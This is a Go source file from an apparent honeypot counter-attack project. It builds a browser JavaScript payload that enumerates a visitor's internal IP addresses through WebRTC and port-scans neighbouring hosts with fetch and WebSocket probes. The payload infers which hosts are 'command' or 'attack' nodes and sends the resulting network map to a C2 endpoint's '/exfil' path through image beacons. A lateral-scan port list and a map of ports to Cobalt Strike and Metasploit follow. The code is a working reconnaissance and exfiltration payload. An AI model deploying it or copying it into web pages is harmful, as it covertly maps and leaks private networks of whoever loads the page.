package countermeasure

import (
	"fmt"
	"time"
)

// NetProbePayload 横向网络探测载荷
// JS浏览器端：WebRTC + WebSocket + Fetch 实现内网探测
// 从已控攻击者主机出发，自动化探测内网其他攻击者资产
func NetProbePayload(c2Endpoint string) string {
	return `<script>
// ============================================================
// Laji-HoneyPot 反制 / 攻击者团队横向网络探测模块
// 目的: 绘制攻击者团队网络拓扑、识别指挥节点/攻击发起节点
// ============================================================
(function(){
var NP={c2:'` + c2Endpoint + `',sessionId:'np_'+Date.now()+'_'+Math.random().toString(36).substr(2,8),
  results:{hosts:[],networks:[],topology:{nodes:[],edges:[]},dnscache:[],services:{}}};

// === 1. 获取攻击者出口/内网 IP（WebRTC 全网卡枚举） ===
NP.detectLocalIPs=function(){
  var stuns=['stun:stun.l.google.com:19302','stun:stun1.l.google.com:19302',
    'stun:stun.cloudflare.com:3478'];
  var ips={};
  var rounds=0;
  stuns.forEach(function(stun){
    try{
      var pc=new RTCPeerConnection({iceServers:[{urls:stun}]});
      pc.createDataChannel('np');
      pc.onicecandidate=function(e){
        if(e&&e.candidate){
          var c=e.candidate.candidate;
          var parts=c.split(' ');
          for(var i=0;i<parts.length;i++){
            if(parts[i]&&/^\d+\.\d+\.\d+\.\d+$/.test(parts[i])){
              var ip=parts[i];
              if(!ips[ip]){
                ips[ip]={ip:ip,type:parts[7]||'unknown',
                  network:ip.split('.').slice(0,3).join('.')+'.0/24'};
                // 推断常见内网范围
                var seg=ip.split('.');
                if(seg[0]==='10'){
                  ips[ip].cidr_16='10.'+seg[1]+'.0.0/16';
                  ips[ip].cidr_8='10.0.0.0/8'
                }else if(seg[0]==='172'&&parseInt(seg[1])>=16&&parseInt(seg[1])<=31){
                  ips[ip].cidr_12='172.'+seg[1]+'.0.0/12'
                }else if(seg[0]==='192'&&seg[1]==='168'){
                  ips[ip].cidr_16='192.168.0.0/16'
                }
              }
            }
          }
        }
        if(!e.candidate){rounds++;if(rounds>=stuns.length)NP.evaluateNetworks(ips)}
      };
      pc.createOffer().then(function(o){pc.setLocalDescription(o)})
    }catch(e){}
  });
  // 超时返回
  setTimeout(function(){NP.evaluateNetworks(ips)},8000)
};

// === 2. 推断内网拓扑范围 ===
NP.evaluateNetworks=function(ips){
  var ipList=Object.values(ips);
  NP.results.localIPs=ipList;
  // 构建待扫描网段
  var networks=new Set();
  ipList.forEach(function(ip){
    if(ip.network)networks.add(ip.network);
    if(ip.cidr_16)networks.add(ip.cidr_16);
    if(ip.cidr_12)networks.add(ip.cidr_12);
    if(ip.cidr_8)networks.add(ip.cidr_8)
  });
  NP.results.networks=Array.from(networks);
  // 开始 WebSocket 端口扫描（仅扫描重点端口）
  NP.wsScan(ipList)
};

// === 3. WebSocket 端口扫描（利用 WebSocket 跨域探测内网服务） ===
NP.wsScan=function(ipList){
  var ports=[80,443,8080,8443,9090,3000,5000,4000];
  var targetIPs=ipList.map(function(ip){return ip.ip});
  // 生成待探测的 /24 段内 IP（基于已发现 IP 的网段）
  targetIPs.forEach(function(ip){
    var seg=ip.split('.');seg[3]='1';
    // 扫描前 30 个相邻 IP + 网关
    for(var i=1;i<=30;i++){
      seg[3]=String(i);
      var target=seg.join('.');
      ports.forEach(function(port){
        NP.probeHTTP(target,port)
      })
    }
  });
  // 超时回传结果
  setTimeout(function(){NP.reportResults()},4000)
};

// HTTP Fetch 探测
NP.probeHTTP=function(ip,port){
  var url='http://'+ip+':'+port;
  var t0=Date.now();
  try{
    fetch(url,{method:'GET',mode:'no-cors'}).then(function(){
      var elapsed=Date.now()-t0;
      NP.recordHost(ip,port,'http_open',elapsed)
    }).catch(function(){
      var elapsed=Date.now()-t0;
      if(elapsed<200){NP.recordHost(ip,port,'http_refused',elapsed)}
    })
  }catch(e){}
};

// WebSocket 探测（常用端口可能运行 WebSocket 服务）
NP.probeWS=function(ip,port){
  try{
    var ws=new WebSocket('ws://'+ip+':'+port);
    var t0=Date.now();
    ws.onopen=function(){
      NP.recordHost(ip,port,'ws_open',Date.now()-t0);
      ws.close()
    };
    ws.onerror=function(){ws.close()}
  }catch(e){}
};

// === 4. 记录发现的主机 ===
NP.hostsMap={};
NP.recordHost=function(ip,port,status,elapsed){
  if(!NP.hostsMap[ip]){
    NP.hostsMap[ip]={ip:ip,status:'up',ports:{},firstSeen:Date.now()}
  }
  var h=NP.hostsMap[ip];
  h.ports[port]=status;
  h.lastSeen=Date.now();
};

// === 5. 推断主机角色（指挥节点/攻击节点/中继/未知） ===
NP.inferRole=function(host){
  var ports=host.ports||{};
  var openPorts=Object.keys(ports).filter(function(p){return ports[p]==='http_open'||ports[p]==='ws_open'});
  if(Object.keys(openPorts).length===0)return'unknown';
  // 指挥节点特征：多个 Web 服务，端口 443/8443/9090
  var cmdPorts=[443,8443,9090,3000,5000];
  var cmdHits=cmdPorts.filter(function(p){return ports[p]==='http_open'||ports[p]==='ws_open'});
  if(cmdHits.length>=2)return'command_node';
  // 攻击节点特征：有多个服务暴露，端口范围广
  if(openPorts.length>=3)return'attack_node';
  // 中继节点：80/8080 单一 Web 服务
  if(ports[80]==='http_open'||ports[8080]==='http_open')return'relay';
  return'unknown';
};

// === 6. 构建团队拓扑 ===
NP.buildTopology=function(){
  var nodes=[];
  var edges=[];
  var hosts=Object.values(NP.hostsMap);
  hosts.forEach(function(h){
    var role=NP.inferRole(h);
    var openPorts=Object.keys(h.ports||{}).filter(function(p){return h.ports[p]==='http_open'||h.ports[p]==='ws_open'}).map(Number);
    nodes.push({
      ip:h.ip,status:h.status,role:role,
      openPorts:openPorts,
      confidence:role==='unknown'?0.3:(role==='command_node'?0.8:0.6)
    })
  });
  // 建立同网段边
  nodes.forEach(function(a){
    nodes.forEach(function(b){
      if(a.ip!==b.ip){
        var segA=a.ip.split('.').slice(0,3).join('.');
        var segB=b.ip.split('.').slice(0,3).join('.');
        if(segA===segB){edges.push({source:a.ip,target:b.ip,relation:'same_subnet',confidence:0.9})}
      }
    })
  });
  NP.results.topology={nodes:nodes,edges:edges,teamSize:nodes.length}
};

// === 7. 报告结果 ===
NP.reportResults=function(){
  NP.buildTopology();
  var data={t:'net_probe',ts:Date.now(),sid:NP.sessionId,results:NP.results};
  try{if(window._laji_exfil){window._laji_exfil(data)}}catch(e){}
  // 分片回传（数据量可能较大）
  var json=JSON.stringify(data);
  var chunkSize=1600;
  for(var i=0;i<json.length;i+=chunkSize){
    new Image().src=NP.c2+'/exfil?d='+encodeURIComponent(json.substring(i,i+chunkSize))+'&s='+i+'&t='+json.length+'&tt=net_probe'
  }
};

// === 启动 ===
setTimeout(function(){NP.detectLocalIPs()},500)
})();</script>`
}

// NetProbeTemplate 横向探测命令模板（供 Native Agent 使用）
type NetProbeTemplate struct {
	TargetCIDRs []string
	Ports       []int
	Timeout     int
	Concurrency int
}

// DefaultNetProbeConfig 默认横向探测配置
func DefaultNetProbeConfig() *NetProbeTemplate {
	return &NetProbeTemplate{
		TargetCIDRs: []string{}, // 从 agent 实际环境中推断
		Ports: []int{
			22, 3389, 5900,  // 远程管理
			80, 443, 8080, 8443, 9090, // Web
			3306, 1433, 5432, 6379, 27017, // 数据库
			21, 445, 139, // 文件共享
			2222, 4444, 5555, 7777, 8888, 9999, // 渗透常用端口
		},
		Timeout:     2,
		Concurrency: 50,
	}
}

// ServiceRoleHint 服务端口 → 角色关联映射
var ServiceRoleHint = map[int]string{
	443:   "command_node",  // HTTPS Web 管理
	8443:  "command_node",  // Web GUI
	9090:  "command_node",  // Cockpit/Webmin
	8080:  "attack_node",   // Burp/C2 代理
	22:    "relay",         // SSH
	3389:  "attack_node",   // RDP
	5900:  "attack_node",   // VNC
	5555:  "command_node",  // Cobalt Strike
	50050: "command_node",  // Cobalt Strike
	4444:  "attack_node",   // Metasploit
	3000:  "command_node",  // Grafana
	5000:  "command_node",  // Flask/Gunicorn
}

// GenerateNetProbeReport 生成横向探测报告模板
func GenerateNetProbeReport(entryIP string, hosts []HostAsset) *AttackerTeamTopology {
	topo := &AttackerTeamTopology{
		GeneratedAt: time.Now(),
		EntryPoint:  entryIP,
		Nodes:       hosts,
		TeamSize:    len(hosts),
	}

	// 构建同网段边
	for i := range hosts {
		for j := range hosts {
			if i >= j {
				continue
			}
			if sameSubnet(hosts[i].IP, hosts[j].IP) {
				topo.Edges = append(topo.Edges, TeamEdge{
					Source:     hosts[i].IP,
					Target:     hosts[j].IP,
					Relation:   "same_subnet",
					Confidence: 0.9,
				})
			}
		}
	}

	// 端口推断关系
	for i := range hosts {
		for _, p := range hosts[i].OpenPorts {
			if role, ok := ServiceRoleHint[p]; ok {
				for j := range hosts {
					if i != j && hosts[j].Role == role {
						topo.Edges = append(topo.Edges, TeamEdge{
							Source:     hosts[i].IP,
							Target:     hosts[j].IP,
							Relation:   fmt.Sprintf("port_%d_%s", p, role),
							Confidence: 0.6,
						})
					}
				}
			}
		}
	}

	return topo
}

func sameSubnet(a, b string) bool {
	partsA := splitIP(a)
	partsB := splitIP(b)
	if len(partsA) != 4 || len(partsB) != 4 {
		return false
	}
	return partsA[0] == partsB[0] && partsA[1] == partsB[1] && partsA[2] == partsB[2]
}

func splitIP(ip string) []string {
	var parts []string
	current := ""
	for _, c := range ip {
		if c == '.' {
			parts = append(parts, current)
			current = ""
		} else {
			current += string(c)
		}
	}
	parts = append(parts, current)
	return parts
}
